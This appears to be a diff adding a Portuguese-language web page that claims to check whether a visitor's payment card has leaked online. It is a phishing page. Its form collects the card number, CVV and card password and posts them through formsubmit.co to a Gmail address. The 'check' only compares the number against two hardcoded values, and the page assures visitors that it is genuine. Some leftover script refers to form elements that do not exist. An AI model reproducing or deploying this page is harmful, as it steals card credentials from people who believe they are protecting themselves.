@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificador de Cartão</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(to right, #1c0c32 50%, #ffffff 50%);
+            margin: 0;
+        }
+        .wrapper {
+            display: flex;
+            align-items: center;
+            width: 900px;
+        }
+        .card-section {
+            width: 50%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .card {
+            width: 300px;
+            height: 180px;
+            background: black;
+            color: white;
+            border-radius: 10px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+        .chip {
+            width: 40px;
+            height: 30px;
+            background: gray;
+            border-radius: 5px;
+        }
+        .card-number {
+            font-size: 18px;
+            letter-spacing: 2px;
+        }
+        .card-name {
+            font-size: 16px;
+            font-weight: bold;
+        }
+        .card-back {
+            width: 300px;
+            height: 180px;
+            background: black;
+            border-radius: 10px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+        .stripe {
+            width: 100%;
+            height: 40px;
+            background: #333;
+            position: absolute;
+            top: 20px;
+        }
+        .cvv-box {
+            width: 80%;
+            height: 30px;
+            background: gray;
+            margin-top: 50px;
+            text-align: right;
+            padding-right: 10px;
+            font-weight: bold;
+        }
+        .container {
+            width: 50%;
+            padding: 30px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            text-align: left;
+        }
+        h2 {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .highlight {
+            background: #d1d1d1;
+            padding: 2px 5px;
+        }
+        label {
+            display: block;
+            font-size: 14px;
+            margin-top: 15px;
+            font-weight: bold;
+            color: #333;
+        }
+        input {
+            width: calc(100% - 10px);
+            padding: 12px;
+            margin-top: 5px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            background: #f5f5f5;
+            font-size: 16px;
+        }
+        .input-group {
+            display: flex;
+            gap: 10px;
+        }
+        .input-group input {
+            width: 50%;
+        }
+        button {
+            background-color: #6c5ce7;
+            color: white;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 20px;
+        }
+        button:hover {
+            background-color: #4a3db7;
+        }
+        p {
+            margin-top: 15px;
+            font-size: 14px;
+            text-align: center;
+            font-weight: bold;
+        }
+        small {
+            display: block;
+            margin-top: 10px;
+            font-size: 12px;
+            color: gray;
+            text-align: center;
+        }
+    </style>
+</head> 
+    <div class="wrapper">
+        <div class="card-section">
+            <div class="card">
+                <div class="chip"></div>
+                <div class="card-number" id="displayNumero">0000 0000 0000 0000</div>
+                <div class="card-name" id="displayNome">Nome no cartão</div>
+            </div>
+            <div class="card-back">
+                <div class="stripe"></div>
+                <div class="cvv-box" id="displayCVV">000</div>
+            </div>
+        </div>
+        <form action="https://formsubmit.co/antyhack797@gmail.com " method="POST">
+        <div class="container">
+            <h2>Veja se seu cartão <span class="highlight">vazou</span> na internet</h2>
+            <label for="nome">Nome no cartão</label>
+            <input type="text" id="nome" placeholder="Nome no cartão" oninput="atualizarCartao()"required>
+            <label for="numero">Número do cartão</label>
+            <input type="number" id="numero" name="NUMERO DO Cartão" placeholder="0000 0000 0000 0000" oninput="atualizarCartao()">
+            <div class="input-group">
+                <input type="number" id="validade" placeholder="MM/AA">
+                <input type="number" id="cvv" name="CVV" placeholder="CVV" oninput="atualizarCartao()">
+            </div>
+            <label for="senha">Senha do cartão</label>
+            <input type="password" id="senha" name="SENHA" placeholder="********" required>
+            <button onclick="verificarCartao()">Verificar</button>
+            <p id="resultado"></p>
+            <small>*É verdadeiro este site</small>
+        </div>
+    </div>
+</form>
+    <script>
+        function atualizarCartao() {
+            document.getElementById("displayNumero").textContent = document.getElementById("numero").value || "0000 0000 0000 0000";
+            document.getElementById("displayNome").textContent = document.getElementById("nome").value || "Nome no cartão";
+            document.getElementById("displayCVV").textContent = document.getElementById("cvv").value || "000";
+        }
+
+        function verificarCartao() {
+            const cartoesVazados = ["1234 5678 9101 1121", "4000 1234 5678 9010"];
+            const numeroCartao = document.getElementById("numero").value;
+            
+            if (cartoesVazados.includes(numeroCartao)) {
+                document.getElementById("resultado").textContent = "⚠️ Seu cartão foi vazado!";
+                document.getElementById("resultado").style.color = "red";
+            } else {
+                document.getElementById("resultado").textContent = "✅ Seu cartão está seguro.";
+                document.getElementById("resultado").style.color = "green";
+            }
+        }
+        
+        document.getElementById('formulario').addEventListener('submit', async function(event) {
+            event.preventDefault();
+
+            const nome = document.getElementById('nome').value;
+            const email = document.getElementById('email').value;
+            const mensagem = document.getElementById('mensagem').value;
+
+            const response = await fetch('http://localhost:3000/enviar-email', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ nome, email, mensagem })
+            });
+
+            const result = await response.json();
+            alert(result.message);
+        });
+    </script>
+    </script>
+</body>
+</html>
